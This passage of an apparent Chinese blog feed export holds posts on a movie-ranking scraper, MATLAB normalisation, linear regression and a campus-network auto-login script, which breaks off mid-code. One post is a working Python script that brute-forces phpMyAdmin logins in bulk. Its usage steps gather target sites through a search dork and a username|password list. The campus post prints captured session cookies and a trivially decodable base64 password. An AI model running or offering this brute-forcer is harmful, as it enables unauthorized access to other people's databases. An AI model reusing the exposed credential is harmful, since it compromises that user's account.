punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>  response<span class="token punctuation">.</span>text    <span class="token keyword">return</span>  None<span class="token keyword">def</span> <span class="token function">parse_one_page</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">'&lt;dd>.*?board-index.*?>(.*?)&lt;/i>.*?data-src="(.*?)".*?name.*?a.*?>(.*?)&lt;/a>.*?star.*?>(.*?)&lt;/p>.*?releasetime.*?>(.*?)&lt;/p>.*?integer.*?>(.*?)&lt;/i>.*?fraction.*?(.*?)&lt;/i>.*?&lt;/dd>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    items<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">yield</span><span class="token punctuation">{</span>            <span class="token string">'index'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'image'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'title'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'actor'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">3</span> <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'time'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'score'</span><span class="token punctuation">:</span>item<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span>item<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>         <span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">write_to_file</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>content<span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>      <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'http://maoyan.com/board/4?offset='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    html<span class="token operator">=</span>get_one_page<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> parse_one_page<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>        write_to_file<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span>offset<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab中mapminmax函数的总结</title>
      <link href="/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/"/>
      <url>/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="01-mapminmax-函数"><a href="#01-mapminmax-函数" class="headerlink" title="01 mapminmax()函数"></a>01 mapminmax()函数</h2><p><code>mapminmax()</code>函数主要是用来对数据进行归一化处理的函数，它把所有的数据都转换为<code>(0，1)</code>之间的数，目的就是取消各维数据间的数量别差别，防止大数吃小数的现象。</p><h2 id="02-函数接口"><a href="#02-函数接口" class="headerlink" title="02 函数接口"></a>02 函数接口</h2><pre><code>[Y,PS] = mapminmax(X)[Y,PS] = mapminmax(X,FP)Y = mapminmax(&#39;apply&#39;,X,PS)X = mapminmax(&#39;reverse&#39;,Y,PS)</code></pre><h3 id="02-1-函数参数说明"><a href="#02-1-函数参数说明" class="headerlink" title="02-1 函数参数说明"></a>02-1 函数参数说明</h3><p><code>Y</code>是归一化得到的数据，<code>PS</code>是一种描述数据的结构。它们的计算方式是<code>y = (ymax-ymin)*(x-xmin)/(xmax-xmin) + ymin;</code></p><p>倘若这个向量里面有两个相同的数，那么上式就变成分母<code>xmax</code>-<code>xmin</code>为零，这样怎么处理？</p><p><code>matlab</code>在这时会变成<code>y=ymin</code>，<code>ymax</code>和<code>ymin</code>这两个值默认为<code>-1</code>到<code>1</code>，也可以自己设置。</p><p>设置举例：</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span> clear<span class="token operator">>></span> l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span> l <span class="token operator">=</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token operator">>></span> k<span class="token punctuation">.</span>ymin<span class="token operator">=</span><span class="token number">0</span> k <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> ymin<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">>></span> k<span class="token punctuation">.</span>ymax<span class="token operator">=</span><span class="token number">1</span> k <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> ymin<span class="token punctuation">:</span> <span class="token number">0</span>ymax<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token operator">>></span> <span class="token punctuation">[</span>m<span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token operator">=</span>mapminmax<span class="token punctuation">(</span>l<span class="token punctuation">,</span>k<span class="token punctuation">)</span> m <span class="token operator">=</span> <span class="token number">0</span> <span class="token number">0.3333</span> <span class="token number">0.6667</span> <span class="token number">1.0000</span> n <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> name<span class="token punctuation">:</span> <span class="token string">'mapminmax'</span>xrows<span class="token punctuation">:</span> <span class="token number">1</span>xmax<span class="token punctuation">:</span> <span class="token number">4</span>xmin<span class="token punctuation">:</span> <span class="token number">1</span>xrange<span class="token punctuation">:</span> <span class="token number">3</span>yrows<span class="token punctuation">:</span> <span class="token number">1</span>ymax<span class="token punctuation">:</span> <span class="token number">1</span>ymin<span class="token punctuation">:</span> <span class="token number">0</span>yrange<span class="token punctuation">:</span> <span class="token number">1</span>gain<span class="token punctuation">:</span> <span class="token number">0.3333</span>xoffset<span class="token punctuation">:</span> <span class="token number">1</span>no_change<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">></span> 上面还可以这样设置：<span class="token punctuation">[</span>Y<span class="token punctuation">,</span>PS<span class="token punctuation">]</span> <span class="token operator">=</span> mapminmax<span class="token punctuation">(</span>X<span class="token punctuation">,</span>ymin<span class="token punctuation">,</span>ymax<span class="token punctuation">)</span></code></pre><h2 id="03-函数接口说明"><a href="#03-函数接口说明" class="headerlink" title="03 函数接口说明"></a>03 函数接口说明</h2><p>上面已经讲了，<code>1</code>和<code>2</code>函数接口，<code>3</code>函数接口<code>Y = mapminmax(&#39;apply&#39;,X,PS)</code>主要是用来对其他向量采取同样的归一化（继续采用上面向量的<code>xmax</code>和<code>xmin</code>）对其归一化。 第三种<code>X = mapminmax(&#39;reverse&#39;,Y,PS)</code>就是对数据进行反归一化，就是通过存储在<code>PS</code>的结构的值计算原来的值。</p><h2 id="04-矩阵归一化"><a href="#04-矩阵归一化" class="headerlink" title="04 矩阵归一化"></a>04 矩阵归一化</h2><p>默认规范范围<code>(-1,1)</code>若想将规范范围划为<code>(-1,1)</code>，可编写<code>Y=mapminmax(A,0,1);</code></p><p>此函数规整行向量中最大最小值，如果运用此函数，则<code>A</code>矩阵每一行为一个维度，每一列是一个样本，所以一般在使用这个函数对样本进行归一化的时候就要将矩阵转置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习之线性回归方法</title>
      <link href="/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/"/>
      <url>/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="1-多元线性回归"><a href="#1-多元线性回归" class="headerlink" title="1. 多元线性回归"></a>1. 多元线性回归</h2><p>以预测房子价格为例，房子的属性除了其面积大小外，这里还有房子楼层数、房子年龄、厅室数等。也就是说一个房子的特征将不只一个，而是多个。这里用<code>n</code>表示特征数目，<code>x(i)</code>表示的是训练集中第<code>i</code>个样本的特征向量，<code>x(i)j</code>表示的第<code>i</code>个样本的第<code>j</code>个特征值,同时为每个记录增加一个属性<code>x0=1</code>.对于这个预测房价的问题我们首先要估计未知参数<code>x0......xn</code>的值，为此我们进行<code>n</code>次独立观测，得到n组数据样本，将它们带入方程可以得到一个方程组，我们将其矩阵化表示。</p><h2 id="2-参数x0到xn的求解"><a href="#2-参数x0到xn的求解" class="headerlink" title="2.参数x0到xn的求解"></a>2.参数x0到xn的求解</h2><p>我们需要求得参数，需要使用参数的最小二乘估计，我们需要选择<code>x0-xn</code>的参数使残差平方和得到最小</p><p>残差平方和就是，实际值减去预测值的平方。</p><h3 id="2-1-梯度下降法"><a href="#2-1-梯度下降法" class="headerlink" title="2.1 梯度下降法"></a>2.1 梯度下降法</h3><p>梯度下降法：就是将残差平方和对每一个特征进行偏导，这个得到的倒数可以类似于一坡度，我们需要不断的根据这点的坡度逼近最低点，需要不停的进行迭代。在梯度下降之前，有时候数据不同特征之间存在很大的差距，有的范围在<code>1000-2000</code>之间，而有的仅在<code>0-10之</code>间，这时候就会使得大数吃小数的情况，同时使得数据不便处理，为了使得数据的范围大致相同，我们需要对数据进行归一化。目前有三种归一化方法：</p><p>1)<code>mapminmax</code>，最大最小化方法，缺点：当新数据加入的时候，可能导致<code>max</code>和<code>min</code>发生变化，需要重新定义。</p><p>2)<code>log</code>函数转换</p><p>3)<code>z-score</code> <code>normalization</code>:标准差标准化</p><p>算法原理：根据刚才得到的残差平方表示的方程组，对每一个特征的参数进行偏导，然后根据偏导不断迭代最终逼近残差最小的值，得到参数的估计值。</p><h3 id="2-2-利用归一化方程"><a href="#2-2-利用归一化方程" class="headerlink" title="2.2 利用归一化方程"></a>2.2 利用归一化方程</h3><p>刚才我们得到了残差平方和的式子，利用微积分的极值法，我们对每一个参数进行偏导使得等于0，得到一组方程组，将其表示成矩阵形式，移项等矩阵运算就得到归一化方程。</p><h3 id="2-3-两种求解方法的比较"><a href="#2-3-两种求解方法的比较" class="headerlink" title="2.3 两种求解方法的比较"></a>2.3 两种求解方法的比较</h3><p>1)梯度下降求解法：</p><p>优点：当<code>Features</code>数量很大的时候，就是特征数量很大的时候，梯度下降比归一化方程求解好。</p><p>缺点：需要将数据预处理，进行归一化，还要初始化学习速率，比较麻烦。</p><p>2)归一化方程：</p><p>优点：比较快速同时比较方便</p><p>缺点：当特征值特别多的时候比较慢，同时如果特征值之间存在多重共线性，导致x的转置乘以x将会没有逆矩阵，计算不出参数的估计值。</p><h2 id="3-回归方程和回归参数的显著性检验"><a href="#3-回归方程和回归参数的显著性检验" class="headerlink" title="3.回归方程和回归参数的显著性检验"></a>3.回归方程和回归参数的显著性检验</h2><p>我们通过上面建立的回归模型到底因变量和自变量是否存在线性关系？这个还需要们对其进行假设检验进行验证。</p><p>总离差平方和<code>SST</code>：数据的真实值<code>y</code>减去真实值的平均值的平方。反映了数据的波动性大小。<br>残差平方和<code>SSE</code>：真实值减去观测值的平方。 反映了除去<code>y</code>与<code>x</code>之间的线性关系之外的因素引起的数据y的波动。<br>回归平方和<code>SSR</code>：预测值减去真实值的平均值的平方。反映了线性拟合值与它们平均值的总偏差。</p><p>利用代数运算和正规方程组得到<code>SST=SSR+SSE</code>.所以<code>SSR</code>越大，说明由回归关系得到的观测值的波动性比例越大，就是说<code>y</code>与<code>x</code>的线性关系越显著，拟合效果越好。自由度相应的也需要进行分解，<code>n-1=(n-p-1)+p</code>最后基于自由度的分解，我们建立方差分析表。<code>SSR</code>均方差等于<code>MSR=SSR/P</code>,<code>MSE=SSE/(N-P-1)</code>,<code>F=MSR/MSE</code>。当假设<code>y</code>与<code>x1</code>,<code>x2</code>,…<code>xn</code>不存在线性关系时候，<code>F</code>服从于<code>F（p，n-p-1）</code>,尽管已经说明了<code>x</code>与<code>y</code>存在了线性关系，但是每一个特征值<code>x</code>都对<code>y</code>存在显著的影响吗？</p><p>所以我们还需要对其进行单个参数的假设检验。接下来我们需要一个拟合优度，它对于衡量模型对样本观测值的拟合程度，在总的离差平方和中，回归平方和占得比例越大，说明拟合效果越来越好，于是通过回归平方和与离差平方和的比例作为判优的标准。它越接近<code>1</code>，说明模型的拟合优度越高。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python批量爆破phpMyadmin</title>
      <link href="/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/"/>
      <url>/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="使用python实现phpMyadmin的批量爆破"><a href="#使用python实现phpMyadmin的批量爆破" class="headerlink" title="使用python实现phpMyadmin的批量爆破"></a>使用python实现phpMyadmin的批量爆破</h2><h3 id="0x01-脚本实现"><a href="#0x01-脚本实现" class="headerlink" title="0x01 脚本实现"></a>0x01 脚本实现</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup <span class="token keyword">as</span> bp<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"</span><span class="token punctuation">}</span>    session<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        soup<span class="token operator">=</span>bp<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>        my_Dict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"hidden"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">}</span>        tiqu<span class="token operator">=</span>soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>attrs<span class="token operator">=</span>my_Dict<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>        data<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span><span class="token operator">=</span>tiqu<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"no token"</span>        data<span class="token punctuation">[</span><span class="token string">'pma_username'</span><span class="token punctuation">]</span><span class="token operator">=</span>username        data<span class="token punctuation">[</span><span class="token string">'pma_password'</span><span class="token punctuation">]</span><span class="token operator">=</span>password        index_url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"index.php"</span>        response1<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>index_url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        htmls<span class="token operator">=</span>response1<span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"phpMyAdmin is more friendly with a "</span> <span class="token keyword">in</span> htmls<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] username:{0}, password:{1}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./Good.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> urls<span class="token punctuation">:</span>        host_t<span class="token operator">=</span>urls<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> url <span class="token keyword">in</span> host_t<span class="token punctuation">:</span>            <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'\n'</span><span class="token punctuation">:</span>                url<span class="token operator">=</span>url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"mima.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> mima<span class="token punctuation">:</span>                my_mima<span class="token operator">=</span>mima<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> mima <span class="token keyword">in</span> my_mima<span class="token punctuation">:</span>                    username<span class="token punctuation">,</span>password<span class="token operator">=</span>mima<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"attack {0} use username:{1}|password:{2}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>                    attack<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span></code></pre><h3 id="0x02-脚本的使用"><a href="#0x02-脚本的使用" class="headerlink" title="0x02 脚本的使用"></a>0x02 脚本的使用</h3><ul><li>先用批量采集工具采集url（关键词：“欢迎使用 phpMyadmin”）</li><li>将采集的url导出为Good.txt路径</li><li>然后密码的格式为:    root|toor  ，|左边为root,右边为toor</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自动登陆校园网</title>
      <link href="/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/"/>
      <url>/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/</url>
      
        <content type="html"><![CDATA[<p>由于每次打开电脑都要手动的登录校园网，导致很麻烦，所以写了一个爬虫来模拟浏览器自动登录校园网的功能</p><h2 id="1-使用Burpsuit对校园网登录界面进行抓包分析"><a href="#1-使用Burpsuit对校园网登录界面进行抓包分析" class="headerlink" title="1.使用Burpsuit对校园网登录界面进行抓包分析"></a>1.使用Burpsuit对校园网登录界面进行抓包分析</h2><p>简介：<code>burpsuite</code>是一款渗透工具，运行环境是<code>Java</code>，所以需要先配置,主要可以用来对<code>HTTP</code>协议的工具包进行分析，也可以扫描网站的漏洞，接下来我们就用它来对校园网登录界面进行一个抓包。</p><h2 id="1-1-设置浏览器代理"><a href="#1-1-设置浏览器代理" class="headerlink" title="1.1 设置浏览器代理"></a>1.1 设置浏览器代理</h2><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4me17q2j31780mztaq.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4mn5krcj30yz0ngmxc.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4mtmx08j30sg0j4dm0.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4n0lhg5j30sg0iyn5j.jpg" alt></p><p>代理，就是拦截到浏览器的前面将数据包截取下来。</p><h3 id="1-2-抓包分析"><a href="#1-2-抓包分析" class="headerlink" title="1.2 抓包分析"></a>1.2 抓包分析</h3><p>浏览器输入网址<code>http://10.10.1.6/srun_portal_pc.php?ac_id=1&amp;&amp;userurl=http://www.lzu.edu.cn</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4noqt36j308c04hq4f.jpg" alt></p><p>然后打开<code>burpsuite</code>，点击<code>forward</code>（前进），就是讲刚才浏览器进行的动作，发送的包截取下来。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4nv60kbj30z00kfdhb.jpg" alt></p><p>我们发现<code>post</code>一个表单到<code>auth_action.php</code>进行处理，在下面<code>cookie</code>里面有一个<code>login</code>还和上面一致。我们将报文复制一份进行分析，</p><pre><code>POST /include/auth_action.php HTTP/1.1Host: 10.10.1.6Content-Length: 116Accept: */*Origin: http://10.10.1.6X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://10.10.1.6/srun_portal_pc.php?ac_id=1&amp;&amp;userurl=http://www.lzu.edu.cnAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAhTQz7gmzQkugXpBZMrQUGiPHbG7NW34vDounugHSLx5A8mO4foZDYk3gvuzEOm8oE2SVDxfjaQLfPK6S3nHNRFaSa5KKhD%252FBgYozWIuXKWglZ6pYHmbs0l2KSqBUsQnuEp%252Fth0bbc%252BjfILH2xC501DX3AWRxf9c4IHUiuZZvZAhRsJGqlP9ypVRn9Ii6bTg%253D%253D; language=en; login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAhTQz7gmzQkugXpBZMrQUGiPHbG7NW34vDounugHSLx5A8mO4foZDYk3gvuzEOm8oE2SVDxfjaQLfPK6S3nHNRFaSa5KKhD%252FBgYozWIuXKWglZ6pYHmbs0l2KSqBUsQnuEp%252Fth0bbc%252BjfILH2xC501DX3AWRxf9c4IHUiuZZvZAhRsJGqlP9ypVRn9Ii6bTg%253D%253DConnection: closeaction=login&amp;username=********&amp;domain=@cernet&amp;password={B}MTk5NjEy&amp;ac_id=1&amp;user_ip=&amp;nas_ip=&amp;user_mac=&amp;save_me=1&amp;ajax=1</code></pre><p>下面是<code>post</code>出去的表单数据，<code>username</code>通过猜测肯定是用户名，然后<code>password</code>是密码，但是发现这个是一个加密的报文，我们来打开<code>firebug</code>查看下网页的<code>javascript</code>代码，发现是<code>base64</code>加密，<br><code>save_me</code>字段应该是是否记住密码，如果点击了记住密码就是<code>1</code>否则就是<code>0</code>，接下来我们验证一下这个密码字段是否是<code>base64</code>.</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4oac6qyj30z40ke0uj.jpg" alt></p><p>选中<code>password</code>字段，然后点击<code>send to decoder</code>，<code>decoder</code>是<code>burp</code>的一个编码解码模块，可以进行解码</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4ohgne3j30z90kigm7.jpg" alt></p><p>发现密码和输入的一致但是前面加了一个<code>{B}</code>，可能有什么标志位，接下来，我们继续对这个包进行分析，我们将它发送到<code>repeater</code>模块（中继器模块）可以对包进行修改。右击选中<code>send to repeater</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4oonn7hj30z10kntal.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4ouv13nj30yp0kj405.jpg" alt></p><p>选择<code>Go</code>,发送包，看返回结果是什么</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4p1f5saj30yl0kgjtp.jpg" alt></p><p><code>login_ok</code>说明我们已经模拟浏览器登陆成功，但是我想测试下去掉几个无关紧要的字段是否也可以登录呢。经过<code>repeater</code>发包测试发现只有这几个字段是必须的。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4p7dbl9j30yn0kegnv.jpg" alt></p><p>经过测试只有<code>request</code>是如上的请求报文，我们就可以登陆成功，接下来我们用<code>python</code>模拟这个请求发送数据。<br>以下是代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl<span class="token operator">=</span><span class="token string">"http://10.10.1.6/include/auth_action.php"</span>password<span class="token operator">=</span><span class="token string">"{B}MTk5NjEy"</span>username<span class="token operator">=</span><span class="token string">"********"</span>ac_id<span class="token operator">=</span><span class="token string">'2'</span>save_me<span class="token operator">=</span><span class="token string">'1'</span>ajax<span class="token operator">=</span><span class="token string">'1'</span>cookie<span class="token operator">=</span><span class="token string">"login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAnZjIv2aOiNLgdcFisQOPGduNfpXrq1m1kMaO3V9pmNJPwW7CiRVsfuOiIH7CP%252BlGaKj03wx3EcoSa1nagEF2HgnfjJcmJl6udXJxskZT0T9dmFgWtrhEObjLeL%252B05%252B3BB0l8ay8RfSeheGn%252F6p7YnxP46H43utiPMSxuZEl5YwF0dIA%253D%253D; language=en; login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAnZjIv2aOiNLgdcFisQOPGduNfpXrq1m1kMaO3V9pmNJPwW7CiRVsfuOiIH7CP%252BlGaKj03wx3EcoSa1nagEF2HgnfjJcmJl6udXJxskZT0T9dmFgWtrhEObjLeL%252B05%252B3BB0l8ay8RfSeheGn%252F6p7YnxP46H43utiPMSxuZEl5YwF0dIA%253D%253D"</span>postdata<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">"username"</span><span class="token punctuation">:</span>username<span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span>    <span class="token string">"ac_id"</span><span class="token punctuation">:</span>ac_id<span class="token punctuation">,</span>    <span class="token string">"save_me"</span><span class="token punctuation">:</span>save_me<span class="token punctuation">,</span>    <span class="token string">"ajax"</span><span class="token punctuation">:</span>ajax<span class="token punctuation">,</span>    <span class="token string">"action"</span><span class="token punctuation">:</span><span class="token string">"login"</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>req<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>postdata<span class="token punctuation">)</span>req<span 